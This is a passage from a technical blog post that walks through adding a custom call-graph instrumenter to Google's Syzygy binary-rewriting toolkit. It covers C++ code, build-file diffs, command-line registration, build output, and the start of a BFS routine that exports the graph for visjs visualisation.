</span><span class='line'><span class="cp">#include &quot;syzygy/instrument/instrumenters/doare_instrumenter.h&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &quot;base/logging.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;base/values.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/application/application.h&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">namespace</span> <span class="n">instrument</span> <span class="p">{</span>
</span><span class='line'><span class="k">namespace</span> <span class="n">instrumenters</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="kt">bool</span> <span class="n">DoareInstrumenter</span><span class="o">::</span><span class="n">InstrumentPrepare</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">bool</span> <span class="n">DoareInstrumenter</span><span class="o">::</span><span class="n">InstrumentImpl</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">transformer_callgraph_</span><span class="p">.</span><span class="n">reset</span><span class="p">(</span><span class="k">new</span> <span class="n">instrument</span><span class="o">::</span><span class="n">transforms</span><span class="o">::</span><span class="n">CallGraphAnalysis</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">relinker_</span><span class="o">-&gt;</span><span class="n">AppendTransform</span><span class="p">(</span><span class="n">transformer_callgraph_</span><span class="p">.</span><span class="n">get</span><span class="p">()))</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">LOG</span><span class="p">(</span><span class="n">ERROR</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;AppendTransform failed.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">DoareInstrumenter</span><span class="o">::</span><span class="n">InstrumentationMode</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="s">&quot;Diary of a reverse engineer&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="p">}</span>  <span class="c1">// namespace instrumenters</span>
</span><span class='line'><span class="p">}</span>  <span class="c1">// namespace instrument</span>
</span></code></pre></td></tr></table></div></figure>


<p>Like before, we also need to add those two files in the <code>instrument.gyp</code> file and regenerate the Ninja project files via the <code>gclient runhooks</code> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">git</span> <span class="n">diff</span> <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span> <span class="n">b</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="n">index</span> <span class="mi">464</span><span class="n">c5566</span><span class="p">..</span><span class="n">c0eceb87</span> <span class="mi">100644</span>
</span><span class='line'><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="err">@@</span> <span class="o">-</span><span class="mi">36</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">36</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">bbentry_instrumenter</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">coverage_instrumenter</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">coverage_instrumenter</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="o">+</span>        <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">doare_instrumenter</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="o">+</span>        <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">doare_instrumenter</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">entry_call_instrumenter</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">entry_call_instrumenter</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">entry_thunk_instrumenter</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="err">@@</span> <span class="o">-</span><span class="mi">68</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">70</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">branch_hook_transform</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">coverage_transform</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">coverage_transform</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="o">+</span>        <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="o">+</span>        <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">entry_call_transform</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">entry_call_transform</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">entry_thunk_transform</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span></code></pre></td></tr></table></div></figure>


<p>The last step for us is to surface our instrumenter to the main of the application. I just add a mode called <code>doare</code> that you can set via the <code>--mode</code> switch, and if the flag is specified it instantiates the newly born <code>DoareInstrumenter</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">git</span> <span class="n">diff</span> <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument_app</span><span class="p">.</span><span class="n">cc</span>
</span><span class='line'><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument_app</span><span class="p">.</span><span class="n">cc</span> <span class="n">b</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument_app</span><span class="p">.</span><span class="n">cc</span>
</span><span class='line'><span class="n">index</span> <span class="mi">72</span><span class="n">bb40b8</span><span class="p">..</span><span class="n">c54258d8</span> <span class="mi">100644</span>
</span><span class='line'><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument_app</span><span class="p">.</span><span class="n">cc</span>
</span><span class='line'><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument_app</span><span class="p">.</span><span class="n">cc</span>
</span><span class='line'><span class="err">@@</span> <span class="o">-</span><span class="mi">29</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">29</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span>
</span><span class='line'> <span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/bbentry_instrumenter.h&quot;</span>
</span><span class='line'> <span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/branch_instrumenter.h&quot;</span>
</span><span class='line'> <span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/coverage_instrumenter.h&quot;</span>
</span><span class='line'><span class="o">+</span><span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/doare_instrumenter.h&quot;</span>
</span><span class='line'> <span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/entry_call_instrumenter.h&quot;</span>
</span><span class='line'> <span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/entry_thunk_instrumenter.h&quot;</span>
</span><span class='line'> <span class="err">#</span><span class="n">include</span> <span class="s">&quot;syzygy/instrument/instrumenters/flummox_instrumenter.h&quot;</span>
</span><span class='line'><span class="err">@@</span> <span class="o">-</span><span class="mi">41</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">42</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">kUsageFormatStr</span><span class="p">[]</span> <span class="o">=</span>
</span><span class='line'>     <span class="s">&quot;Usage: %ls [options]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>     <span class="s">&quot;  Required arguments:</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>     <span class="s">&quot;    --input-image=&lt;path&gt; The input image to instrument.</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="o">-</span>    <span class="s">&quot;    --mode=afl|asan|bbentry|branch|calltrace|coverage|flummox|profile</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="o">+</span>    <span class="s">&quot;    --mode=afl|asan|bbentry|branch|calltrace|coverage|doare|flummox|profile</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>     <span class="s">&quot;                            Specifies which instrumentation mode is to</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>     <span class="s">&quot;                            be used. If this is not specified it is</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>     <span class="s">&quot;                            equivalent to specifying --mode=calltrace</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="err">@@</span> <span class="o">-</span><span class="mi">192</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">193</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="kt">bool</span> <span class="n">InstrumentApp</span><span class="o">::</span><span class="n">ParseCommandLine</span><span class="p">(</span><span class="k">const</span> <span class="n">base</span><span class="o">::</span><span class="n">CommandLine</span><span class="o">*</span> <span class="n">cmd_line</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>           <span class="n">instrumenters</span><span class="o">::</span><span class="n">EntryThunkInstrumenter</span><span class="o">::</span><span class="n">CALL_TRACE</span><span class="p">));</span>
</span><span class='line'>     <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">LowerCaseEqualsASCII</span><span class="p">(</span><span class="n">mode</span><span class="p">,</span> <span class="s">&quot;coverage&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">instrumenter_</span><span class="p">.</span><span class="n">reset</span><span class="p">(</span><span class="k">new</span> <span class="n">instrumenters</span><span class="o">::</span><span class="n">CoverageInstrumenter</span><span class="p">());</span>
</span><span class='line'><span class="o">+</span>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">LowerCaseEqualsASCII</span><span class="p">(</span><span class="n">mode</span><span class="p">,</span> <span class="s">&quot;doare&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'><span class="o">+</span>      <span class="n">instrumenter_</span><span class="p">.</span><span class="n">reset</span><span class="p">(</span><span class="k">new</span> <span class="n">instrumenters</span><span class="o">::</span><span class="n">DoareInstrumenter</span><span class="p">());</span>
</span><span class='line'>     <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">LowerCaseEqualsASCII</span><span class="p">(</span><span class="n">mode</span><span class="p">,</span> <span class="s">&quot;flummox&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">instrumenter_</span><span class="p">.</span><span class="n">reset</span><span class="p">(</span><span class="k">new</span> <span class="n">instrumenters</span><span class="o">::</span><span class="n">FlummoxInstrumenter</span><span class="p">());</span>
</span><span class='line'>     <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">LowerCaseEqualsASCII</span><span class="p">(</span><span class="n">mode</span><span class="p">,</span> <span class="s">&quot;profile&quot;</span><span class="p">))</span> <span class="p">{</span>
</span></code></pre></td></tr></table></div></figure>


<p>This should be it! Recompiling the <code>instrument</code> project should be enough to be able to invoke the transform and see some of our debug messages:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">Downloads</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">ninja</span> <span class="o">-</span><span class="n">C</span> <span class="n">out</span><span class="err">\</span><span class="n">Release</span> <span class="n">instrument</span>
</span><span class='line'><span class="nl">ninja:</span> <span class="n">Entering</span> <span class="n">directory</span> <span class="err">`</span><span class="n">out</span><span class="err">\</span><span class="n">Release</span><span class="err">&#39;</span>
</span><span class='line'><span class="p">[</span><span class="mi">4</span><span class="o">/</span><span class="mi">4</span><span class="p">]</span> <span class="n">LINK_EMBED</span> <span class="n">instrument</span><span class="p">.</span><span class="n">exe</span>
</span><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">Downloads</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">out</span><span class="err">\</span><span class="n">Release</span><span class="err">\</span><span class="n">instrument</span><span class="p">.</span><span class="n">exe</span> <span class="o">--</span><span class="n">input</span><span class="o">-</span><span class="n">image</span><span class="o">=</span><span class="n">out</span><span class="err">\</span><span class="n">Release</span><span class="err">\</span><span class="n">instrument</span><span class="p">.</span><span class="n">exe</span> <span class="o">--</span><span class="n">output</span><span class="o">-</span><span class="n">image</span><span class="o">=</span><span class="n">nul</span> <span class="o">--</span><span class="n">mode</span><span class="o">=</span><span class="n">doare</span> <span class="o">--</span><span class="n">verbose</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'><span class="p">[</span><span class="mi">0902</span><span class="o">/</span><span class="mi">120452</span><span class="o">:</span><span class="nl">VERBOSE1:</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">cc</span><span class="p">(</span><span class="mi">22</span><span class="p">)]</span> <span class="n">instrument</span><span class="o">::</span><span class="n">transforms</span><span class="o">::</span><span class="n">CallGraphAnalysis</span><span class="o">::</span><span class="nl">OnBlock:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">AddressSpace</span><span class="o">::</span><span class="n">GetBlockByAddress</span>
</span><span class='line'><span class="p">[</span><span class="mi">0902</span><span class="o">/</span><span class="mi">120452</span><span class="o">:</span><span class="nl">VERBOSE1:</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">cc</span><span class="p">(</span><span class="mi">36</span><span class="p">)]</span> <span class="n">pe</span><span class="o">::</span><span class="err">`</span><span class="n">anonymous</span> <span class="k">namespace</span><span class="err">&#39;</span><span class="o">::</span><span class="n">Decompose</span> <span class="o">-&gt;</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">AddressSpace</span><span class="o">::</span><span class="n">GetBlockByAddress</span>
</span><span class='line'><span class="p">[</span><span class="mi">0902</span><span class="o">/</span><span class="mi">120452</span><span class="o">:</span><span class="nl">VERBOSE1:</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">cc</span><span class="p">(</span><span class="mi">36</span><span class="p">)]</span> <span class="n">pe</span><span class="o">::</span><span class="err">`</span><span class="n">anonymous</span> <span class="k">namespace</span><span class="err">&#39;</span><span class="o">::</span><span class="n">Decompose</span> <span class="o">-&gt;</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">AddressSpace</span><span class="o">::</span><span class="n">GetBlockByAddress</span>
</span><span class='line'><span class="p">[...]</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Visualize it?</h3>

<p>As I was writing this I figured it might be worth to spend a bit of time trying to visualize this network to make it more attractive for the readers. So I decided to use <a href="http://visjs.org/network_examples.html">visjs</a> and the <code>Post</code> callback to output the call-graph in a way visjs would understand:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="kt">bool</span> <span class="n">CallGraphAnalysis</span><span class="o">::</span><span class="n">PostBlockGraphIteration</span><span class="p">(</span>
</span><span class='line'>    <span class="k">const</span> <span class="n">TransformPolicyInterface</span><span class="o">*</span> <span class="n">policy</span><span class="p">,</span>
</span><span class='line'>    <span class="n">BlockGraph</span><span class="o">*</span> <span class="n">block_graph</span><span class="p">,</span>
</span><span class='line'>    <span class="n">Block</span><span class="o">*</span> <span class="n">header_block</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">VLOG</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;      Blocks found: &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">total_blocks_</span><span class="p">;</span>
</span><span class='line'>  <span class="n">VLOG</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; Code Blocks found: &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">total_code_blocks_</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">main_block_</span> <span class="o">==</span> <span class="n">nullptr</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">LOG</span><span class="p">(</span><span class="n">ERROR</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;A &#39;main&#39; block is mandatory.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Now we walk the graph from the &#39;main&#39; block, with a BFS algorithm.</span>
</span><span class='line'>  <span class="n">uint32_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">level</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">list</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">Block</span><span class="o">*</span><span class="p">,</span> <span class="n">Block</span><span class="o">*&gt;&gt;</span> <span class="n">selected_edges</span><span class="p">;</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">Block</span><span class="o">*</span><span class="p">,</span> <span class="n">uint32_t</span><span class="o">&gt;</span> <span class="n">selected_nodes</span><span class="p">;</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">Block</span><span class="o">*</span><span class="p">,</span> <span class="n">uint32_t</span><span class="o">&gt;</span> <span class="n">selected_nodes_levels</span><span class="p">;</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">set</span><span class="o">&lt;</span><span class="n">Block</span><span class="o">*&gt;</span> <span class="n">nodes_to_inspect</span><span class="p">{</span><span class="n">main_block_</span><span class="p">};</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">nodes_to_inspect</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Make a copy of the node to inspect so that we can iterate</span>
</span><span class='line'>    <span class="c1">// over them.</span>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">set</span><span class="o">&lt;</span><span class="n">Block</span><span class="o">*&gt;</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">nodes_to_inspect</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// The node selected to be inspected in the next iteration of</span>
</span><span class='line'>    <span class="c1">// the loop will be added in this set.</span>
</span><span class='line'>    <span class="n">nodes_to_inspect</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Go through every nodes to find to what nodes they are connected</span>
</span><span class='line'>    <span class="c1">// to.</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="n">node_to_inspect</span> <span class="o">:</span> <span class="n">tmp</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">// Assign an index and a level to the node.</span>
</span><span class='line'>      <span class="n">selected_nodes</span><span class="p">.</span><span class="n">emplace</span><span class="p">(</span><span class="n">node_to_inspect</span><span class="p">,</span> <span class="n">idx</span><span class="o">++</span><span class="p">);</span>
</span><span class='line'>      <span class="n">selected_nodes_levels</span><span class="p">[</span><span class="n">node_to_inspect</span><span class="p">]</span> <span class="o">=</span> <span class="n">level</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="c1">// Now let&#39;s iterate through the edges to find to what nodes, the current</span>
</span><span class='line'>      <span class="c1">// one is connected to.</span>
</span><span class='line'>      <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="n">edge</span> <span class="o">:</span> <span class="n">edges_</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// We are interested to find edges connected to the current node.</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">edge</span><span class="p">.</span><span class="n">first</span> <span class="o">!=</span> <span class="n">node_to_inspect</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Get the connected node and make sure we haven&#39;t handled it already.</span>
</span><span class='line'>        <span class="n">Block</span><span class="o">*</span> <span class="n">to_block</span><span class="p">(</span><span class="n">edge</span><span class="p">.</span><span class="n">second</span><span class="p">);</span>
